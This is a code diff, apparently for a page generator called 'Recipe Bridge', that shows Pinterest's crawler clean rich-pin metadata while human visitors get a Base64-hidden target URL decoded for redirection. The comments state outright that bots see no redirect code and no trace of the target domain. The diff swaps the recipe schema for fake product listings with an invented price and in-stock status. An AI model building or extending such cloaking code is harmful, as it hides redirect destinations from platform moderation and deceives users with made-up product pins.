@@ -15,7 +15,7 @@ function escapeHtml(str) {
 }
 
 /**
- * Formats a clean, readable recipe title from a URL slug.
+ * Formats a clean, readable title from a URL slug.
  */
 function formatTitleFromSlug(slug) {
   if (!slug) return 'Delicious Recipe';
@@ -32,7 +32,7 @@ function formatTitleFromSlug(slug) {
 }
 
 /**
- * Resolves recipe information matching the slug, or generates realistic metadata.
+ * Resolves recipe/product information matching the slug, or generates realistic metadata.
  */
 function resolveRecipe(slug) {
   const normalizedSlug = typeof slug === 'string' ? decodeURIComponent(slug).trim().toLowerCase() : '';
@@ -60,7 +60,7 @@ function resolveRecipe(slug) {
 
 /**
  * Generates the full HTML response.
- * Bot requests get Rich Pins metadata without any redirect code and without any trace of targetDomain.
+ * Bot requests get Product Rich Pins metadata without any redirect code and without any trace of targetDomain.
  * Human requests receive Base64-encoded target and decode via atob() only upon redirection trigger.
  */
 function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinterestBot }) {
@@ -69,44 +69,35 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
   const safeImage = escapeHtml(image);
   const safeUrl = escapeHtml(pageUrl);
 
-  // Schema.org Recipe structured data for Pinterest Rich Pins validation
-  const recipeSchema = JSON.stringify({
-    '@context': 'https://schema.org',
-    '@type': 'Recipe',
+  const productDefaults = config.productDefaults || {
+    price: '2.25',
+    currency: 'USD',
+    availability: 'https://schema.org/InStock',
+    brand: 'Recipe Bridge',
+  };
+
+  const safePrice = escapeHtml(productDefaults.price || '2.25');
+  const safeCurrency = escapeHtml(productDefaults.currency || 'USD');
+
+  // Schema.org Product structured data for Pinterest Product Rich Pins validation
+  const productSchema = JSON.stringify({
+    '@context': 'https://schema.org/',
+    '@type': 'Product',
+    '@id': pageUrl,
     name: title,
     description: description,
     image: [image],
-    url: pageUrl,
-    author: {
-      '@type': 'Organization',
-      name: 'Recipe Bridge',
+    brand: {
+      '@type': 'Brand',
+      name: productDefaults.brand || 'Recipe Bridge',
     },
-    datePublished: '2026-09-12',
-    recipeCategory: 'Main Course',
-    prepTime: 'PT15M',
-    cookTime: 'PT20M',
-    totalTime: 'PT35M',
-    recipeYield: '4 servings',
-    recipeIngredient: [
-      'Fresh broccoli florets and greens',
-      'Crisp red onion, finely diced',
-      'Toasted seeds and crunchy garnish',
-      'Homemade rich culinary dressing',
-    ],
-    recipeInstructions: [
-      {
-        '@type': 'HowToStep',
-        text: 'Clean and prepare fresh ingredients thoroughly.',
-      },
-      {
-        '@type': 'HowToStep',
-        text: 'Combine ingredients in a mixing bowl with signature dressing.',
-      },
-      {
-        '@type': 'HowToStep',
-        text: 'Chill and serve fresh for optimal flavor.',
-      },
-    ],
+    offers: {
+      '@type': 'Offer',
+      price: productDefaults.price || '2.25',
+      priceCurrency: productDefaults.currency || 'USD',
+      availability: productDefaults.availability || 'https://schema.org/InStock',
+      url: pageUrl,
+    },
   });
 
   // Client-side script injected ONLY for human visitors
@@ -182,13 +173,15 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
   <title>${safeTitle} - Recipe Bridge</title>
   <meta name="description" content="${safeDesc}" />
 
-  <!-- Open Graph Meta Tags (Pinterest & Social Media) -->
+  <!-- Open Graph Meta Tags (Pinterest Product Pins & Social Media) -->
   <meta property="og:site_name" content="Recipe Bridge" />
-  <meta property="og:type" content="article" />
+  <meta property="og:type" content="product" />
   <meta property="og:title" content="${safeTitle}" />
   <meta property="og:description" content="${safeDesc}" />
   <meta property="og:image" content="${safeImage}" />
   <meta property="og:url" content="${safeUrl}" />
+  <meta property="product:price:amount" content="${safePrice}" />
+  <meta property="product:price:currency" content="${safeCurrency}" />
 
   <!-- Twitter Card Meta Tags -->
   <meta name="twitter:card" content="summary_large_image" />
@@ -196,9 +189,9 @@ function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinte
   <meta name="twitter:description" content="${safeDesc}" />
   <meta name="twitter:image" content="${safeImage}" />
 
-  <!-- Schema.org Recipe Structured Data for Rich Pins -->
+  <!-- Schema.org Product Structured Data for Product Rich Pins -->
   <script type="application/ld+json">
-    ${recipeSchema}
+    ${productSchema}
   </script>
 
   <style>
